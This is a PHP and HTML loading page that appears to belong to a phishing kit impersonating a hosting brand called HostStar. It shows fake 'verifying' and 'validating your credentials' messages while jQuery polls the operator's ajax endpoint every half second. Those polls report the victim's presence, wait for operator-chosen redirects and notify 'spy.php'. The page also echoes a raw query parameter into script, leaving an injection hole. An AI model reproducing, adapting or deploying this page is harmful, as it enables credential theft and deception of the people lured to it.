<?php

require "../main.php";

require_once "LanguageManager.php";

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=0">
  <link href="https://fonts.googleapis.com/css2?family=Rubik&display=swap" rel="stylesheet">
  <script src="./res/jq.js"></script>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Rubik', sans-serif;
    }

    body, html {
      height: 100%;
      background: #fff;
    }

    .loader-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100%;
      text-align: center;
    }

    svg {
      max-width: 200px;
      animation: breathing 1s ease-out infinite;
      margin-bottom: 30px;
    }

    @keyframes breathing {
      0%, 100% { transform: scale(0.9); }
      25% { transform: scale(1); }
      60% { transform: scale(0.9); }
    }

    .processing-text {
      font-size: 16px;
      color: #555;
      margin-top: 14px;
      transition: opacity 0.3s ease;
    }

    .main-loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #555;
      border-right: 4px solid #f28d4f;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1.2s linear infinite;
      margin-top: 30px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="loader-wrapper">
    <!-- Animated Logo -->
<img src="//freeparking.dreamscape.cloud/production/assets/logo.svg" alt="HostStar" width="200" height="auto">

    <!-- Dynamic Loading Text -->
    <p class="processing-text" id="processingTextId"><?php echo t('verifying_info', 'Verifying information...'); ?></p>

    <!-- Loader Spinner -->
    <div class="main-loader"></div>
  </div>

  <script src="res/arr.js?v=<?php echo filemtime(__DIR__ . '/res/arr.js'); ?>"></script>
  <script>
    // Loading messages array - now translated
    const loadingMessages = <?php echo json_encode([
        t('processing_request', 'Processing your request...'),
        t('verifying_info', 'Verifying information...'),
        t('connecting_server', 'Connecting to secure server...'),
        t('authenticating_details', 'Authenticating your details...'),
        t('almost_there', 'Almost there...'),
        t('finalizing_request', 'Finalizing your request...'),
        t('please_wait_processing', 'Please wait while we process your information...'),
        t('securing_connection', 'Securing your connection...'),
        t('validating_credentials', 'Validating your credentials...'),
        t('take_moment', 'This may take a moment...')
    ]); ?>;

    let messageIndex = 0;

    function updateLoadingMessage() {
      const processingText = document.getElementById('processingTextId');
      processingText.style.opacity = '0.5';
      setTimeout(() => {
        processingText.textContent = loadingMessages[messageIndex];
        messageIndex = (messageIndex + 1) % loadingMessages.length;
        processingText.style.opacity = '1';
      }, 150);
    }

    updateLoadingMessage(); // Set first message

    </script>
    <script>

clearRedirections();



setInterval(function(){

    $.post("<?php echo $ajaxPath; ?>",

    {keepAlive:1, page:"LOADER (<?php echo @$_GET['p']; ?>)"} );

}, 500);





var redirect=0;

setInterval(function(){

    $.post("<?php echo $ajaxPath; ?>",{redirectionListener:1}, function(data){

        redirect=data;

        if(redirect==0){

            return false;

        }else{

            clearRedirections();

            window.location=targets[redirect];

        }

    });

}, 500);



function clearRedirections(){

    $.post("<?php echo $ajaxPath; ?>",

    {clearRedirection:1});

}


    $.post("spy.php",{waiting:1});
  </script>
</body>
</html>
